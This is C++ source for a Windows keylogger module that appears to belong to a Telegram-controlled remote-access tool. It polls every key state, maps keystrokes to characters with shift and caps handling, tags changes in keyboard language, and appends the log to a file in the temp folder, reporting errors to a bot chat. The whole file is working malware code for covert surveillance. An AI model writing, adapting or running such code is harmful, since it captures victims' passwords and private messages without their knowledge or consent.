#include "keyLogger.h"

static LANGID currentLangID;

static std::string getKeyboardLayout() {
    HWND hwnd = GetForegroundWindow();
    HKL layout = GetKeyboardLayout(GetWindowThreadProcessId(hwnd, NULL));
    LANGID langID = LOWORD(layout);

    if (langID == currentLangID)
        return "";

    currentLangID = langID;

    char language[100];
    if (GetLocaleInfoA(langID, LOCALE_SENGLISHLANGUAGENAME, language, sizeof(language))) {
        return "[" + std::string(language) + "]";
    }
    return "[getKeyboardLayoutError]";
}

void startKeyLogger(TgBot::Bot& bot, int64_t chatId) {
    using namespace std;
    try {
        HWND hwnd = GetForegroundWindow();
        currentLangID = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(hwnd, NULL)));

        string tempFilePath = string(tempPath) + klFileName;
        ofstream outfile(tempFilePath, ios::app);
        if (!outfile) {
            bot.getApi().sendMessage(chatId, "Cannot open output file.");
            return;
        }

        unordered_map<int, bool> pressedKeys;

        unordered_map<int, vector<string>> keyMap = {
            {VK_SPACE, {" "}},
            {VK_NUMPAD0, {"0"}}, {VK_NUMPAD1, {"1"}}, {VK_NUMPAD2, {"2"}}, {VK_NUMPAD3, {"3"}},
            {VK_NUMPAD4, {"4"}}, {VK_NUMPAD5, {"5"}}, {VK_NUMPAD6, {"6"}}, {VK_NUMPAD7, {"7"}},
            {VK_NUMPAD8, {"8"}}, {VK_NUMPAD9, {"9"}},
            {0x30, {"0", ")"}}, {0x31, {"1", "!"}}, {0x32, {"2", "@"}}, {0x33, {"3", "#"}},
            {0x34, {"4", "$"}}, {0x35, {"5", "%"}}, {0x36, {"6", "^"}}, {0x37, {"7", "&"}},
            {0x38, {"8", "*"}}, {0x39, {"9", "("}},
            {VK_MULTIPLY, {"*"}}, {VK_ADD, {"+"}}, {VK_SUBTRACT, {"-"}}, {VK_DECIMAL, {"."}}, {VK_DIVIDE, {"/"}},
            {VK_F1, {"[F1]"}}, {VK_F2, {"[F2]"}}, {VK_F3, {"[F3]"}}, {VK_F4, {"[F4]"}},
            {VK_F5, {"[F5]"}}, {VK_F6, {"[F6]"}}, {VK_F7, {"[F7]"}}, {VK_F8, {"[F8]"}},
            {VK_F9, {"[F9]"}}, {VK_F10, {"[F10]"}}, {VK_F11, {"[F11]"}}, {VK_F12, {"[F12]"}},
            {VK_OEM_PLUS, {"=", "+"}}, {VK_OEM_COMMA, {",", "<"}}, {VK_OEM_MINUS, {"-", "_"}},
            {VK_OEM_PERIOD, {".", ">"}}, {VK_OEM_1, {";", ":"}}, {VK_OEM_2, {"/", "?"}},
            {VK_OEM_3, {"`", "~"}}, {VK_OEM_4, {"[", "{"}}, {VK_OEM_5, {"\\", "|"}},
            {VK_OEM_6, {"]", "}"}}, {VK_OEM_7, {"'", "\""}}
        };

        size_t flushCounter = 0;

        while (isKeyLoggerRunning.load()) {
            bool keyLogged = false;

            for (int i = 0x08; i <= 0xE0; i++) {
                bool isPressed = GetAsyncKeyState(i) & 0x8000;

                if (isPressed && !pressedKeys[i]) {
                    pressedKeys[i] = true;
                    keyLogged = true;

                    outfile << getKeyboardLayout();

                    bool isShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
                    bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001);
                    bool isUpper = isShift ^ isCaps;

                    if (i >= 0x41 && i <= 0x5A) {  // Letters
                        outfile << (isUpper ? (char)i : (char)tolower(i));
                    }
                    else {
                        auto it = keyMap.find(i);
                        if (it != keyMap.end()) {
                            if (it->second.size() == 1) {
                                outfile << it->second[0];
                            }
                            else if (it->second.size() == 2) {
                                outfile << (isShift ? it->second[1] : it->second[0]);
                            }
                        }
                    }
                }
                else if (!isPressed) {
                    pressedKeys[i] = false;
                }
            }

            if (keyLogged) {
                if (++flushCounter % 10 == 0) {
                    outfile.flush();
                }
            }

            this_thread::sleep_for(chrono::milliseconds(10));
        }
    }
    catch (const exception& e) {
        bot.getApi().sendMessage(chatId, "Unexpected error: " + string(e.what()));
    }
}
